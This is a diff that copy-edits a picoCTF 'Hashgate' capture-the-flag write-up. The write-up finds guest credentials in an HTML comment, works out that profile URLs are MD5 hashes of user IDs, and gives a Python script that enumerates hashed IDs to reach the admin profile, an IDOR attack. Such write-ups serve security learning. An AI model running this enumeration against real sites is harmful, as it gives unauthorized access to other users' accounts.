@@ -11,33 +11,33 @@ mermaid: true
 
 ## Introduction
 
-This is another medium web picoCTF challenge titled [Hashgate](https://learn.cylabacademy.org/library/750?category=1&page=1&difficulty=2).
+This is another medium web PicoCTF challenge titled [Hashgate](https://learn.cylabacademy.org/library/750?category=1&page=1&difficulty=2).
 
-It has the following decription:
+It has the following description:
 
-**You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn’t *directly* exposed doesn’t mean it’s secure. Maybe someone forgot that obscurity isn’t security... Can you find your way into the admin’s profile for this organisation and capture the flag?**
+**You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn’t directly exposed doesn’t mean it’s secure. Maybe someone forgot that obscurity isn’t security... Can you find your way into the admin’s profile for this organisation and capture the flag?**
 
-From the description maybe the admin page is not in `/admin` but rather in another confusing or obfuscated path like `/ungabunga` and maybe we may find it in `robots.txt`.
+From the description, maybe the admin page is not in `/admin` but in another confusing or obfuscated path, like `/ungabunga`, and maybe we can find it in `robots.txt`.
 
 ## Recon
 
-Now let's start with basic manual recon seeing what the website offers.
+Now let's start with basic manual recon to see what the website offers.
 
 ### Manual Investigation
 
-When we open the website we find a login form that asks for email and password as shown in the following image.
+When we open the website, we find a login form that asks for an email and password, as shown in the following image.
 
 ![Hashgate login page](../assets/pico/hashgate/hashgate-1.png)
 
-When I try to enter a cred it alerts me a popup saying invalid ones as shown in the following image.
+When I try to enter credentials, it alerts me with a popup saying the credentials are invalid, as shown in the following image.
 
 ![Hashgate invalid login](../assets/pico/hashgate/hashgate-2.png)
 
-Since it alerts maybe the login logic is in the client side written in JS so let's check the code source.
+Since it alerts, maybe the login logic is in the client side and written in JavaScript, so let's check the source code.
 
 ### Code Source
 
-The HTML has all of the following interesting information:
+The HTML has the following interesting information:
 
 ```html
 <!-- Email: guest@picoctf.org Password: guest -->
@@ -92,56 +92,55 @@ The HTML has all of the following interesting information:
 
 The interesting things here are:
 
-1. Some provided credentials in the HTML comment `Email: guest@picoctf.org Password: guest`
-2. Some logic of how the logic system works like it is mentioned in the challenge description if you are identified as a user you get redirected to your own url.
+1. Some provided credentials in the HTML comment: `Email: guest@picoctf.org Password: guest`
+2. Some logic about how the system works, as mentioned in the challenge description: if you are identified as a user, you get redirected to your own URL.
 
-Let's try to login with the provided creds.
+Let's try to log in with the provided credentials.
 
-After logging in we get redirected to the page `/profile/user/e93028bdc1aacdfb3687181f2031765d` and it contains the following text:
+After logging in, we get redirected to the page `/profile/user/e93028bdc1aacdfb3687181f2031765d`, and it contains the following text:
 
 ```txt
 Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.
 ```
 
-Now what is interesting is that hash in the end of the url it is stored in the database because when I login again it stays the same so let's put it on crackstation and see what it gives us.
+Now what is interesting is that the hash at the end of the URL is stored in the database, because when I log in again, it stays the same, so let's put it on CrackStation and see what it gives us.
 
-The interesting thing is shown in the following image it actually is 3000 encoded in md5.
+The interesting thing is shown in the following image: it is actually 3000 encoded in MD5.
 
 ![Hashgate md5](../assets/pico/hashgate/hashgate-3.png)
 
-So basically to access a user you need to put its md5 id hash in the url and thus you can access it.
+So basically, to access a user, you need to put its MD5 ID hash in the URL, and thus you can access it.
 
-I tried to access admin by typing lower priviliges like 0 or 1 or 1000 or even 4000 but the user is not found ... So what we will try is brute forcing but not number by number we will make it a clever script.
+I tried to access the admin by typing lower privileges like 0, 1, 1000, or even 4000, but the user was not found. So what we will try is brute forcing, but not number by number; we will make it a clever script.
 
 ## Exploitation and Payload Writing
 
-First I tried to brute force from 0 to 10000 but it was a long way actually and then I opened to see hints and I saw this `There are about 20 employees in this organisation.` ... They could've mentioned this critical info from the beginning... Now the brute force is from 3000 to 3020 and let's execute the following payload.
+First, I tried to brute force from 0 to 10000, but that was a long way. Then I opened the hints and saw this: `There are about 20 employees in this organisation.` They could have mentioned this critical information from the beginning. Now the brute force is from 3000 to 3020, and let's execute the following payload.
 
 ```py
 import requests
 import hashlib
 
 def store(url):
-	with open("stored.txt", "at") as f:
-		f.write(url+'\n')
+    with open("stored.txt", "at") as f:
+        f.write(url + '\n')
 
-for i in range(3000,3021):
-	
-	url = f"http://crystal-peak.picoctf.net:58340/profile/user/{hashlib.md5(str(i).encode()).hexdigest()}"
-	print(f"trying {i} : URL {url}")
-	r = requests.get(url)
+for i in range(3000, 3021):
+    url = f"http://crystal-peak.picoctf.net:58340/profile/user/{hashlib.md5(str(i).encode()).hexdigest()}"
+    print(f"trying {i} : URL {url}")
+    r = requests.get(url)
 
-	if 'Insufficient' not in r.text and 'User not found' not in r.text:
-		store(url)
+    if 'Insufficient' not in r.text and 'User not found' not in r.text:
+        store(url)
 ```
 
-Basically we loop from 3000 to 3020 and hash each value and go to the desired url if it contains one of the unwanted strings we pass if not we store the url in a txt file.
+Basically, we loop from 3000 to 3020, hash each value, and go to the desired URL. If it contains one of the unwanted strings, we pass; if not, we store the URL in a text file.
 
-After running this script and checking `stored.txt` we find the following link:
-`http://crystal-peak.picoctf.net:58340/profile/user/a74c3bae3e13616104c1b25f9da1f11f` it is for userID 3019 and when we open it we find the flag in the following text:
+After running this script and checking `stored.txt`, we find the following link:
+`http://crystal-peak.picoctf.net:58340/profile/user/a74c3bae3e13616104c1b25f9da1f11f`. It is for user ID 3019, and when we open it, we find the flag in the following text:
 
 `Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_FindYourOwn}`
 
 ## Conclusion
 
-That was a nice yet weird exploitation of IDOR ... felt like guessing but I should've brute forced from 3000 rather than starting from 0 that would take forever.
+That was a nice but weird exploitation of IDOR. It felt like guessing, but I should have brute forced from 3000 rather than starting from 0, which would have taken forever.
